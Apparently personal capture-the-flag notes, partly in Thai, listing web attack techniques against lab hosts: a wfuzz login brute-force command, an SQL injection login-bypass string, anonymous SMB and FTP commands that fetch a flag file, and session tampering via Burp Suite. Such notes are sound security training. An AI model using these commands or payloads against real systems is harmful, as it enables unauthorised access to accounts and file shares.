#web 
# Bruteforce
## Word List
rockyou.txt
## Wfuzz
### Command
```bash
sudo wfuzz -z file,/home/drasogun/Desktop/password/password.txt -d "username=admin%40dropctf.live&password=FUZZ&login_user=" --hh 0  http://172.18.0.9/login_db.php
```
### Tool
burtsuite เพื่อเอา data ที่ต้องใช้ในคำสั่ง
# Bypass
## SQL Injection
’ OR '1'='1
## Bypass Authentication
Sign in User ที่มีอยู่แล้วเพื่อทับข้อมูลเดิม แล้ว Login User นั้น
# Anonymous Login
## Samba
### Command
```bash
smbclient -L 172.18.0.64
smbclient \\\\172.18.0.64\\public
get flag.txt
```
## FTP
### Command
```bash
ftp 172.18.0.64  (user&password = anonymous)
passive on
get flag.txt
```
# Session Management
## Step
1. Login
2. Burp suit ปลอมแปลง session ตอน login (user=daftpunk → user=admin)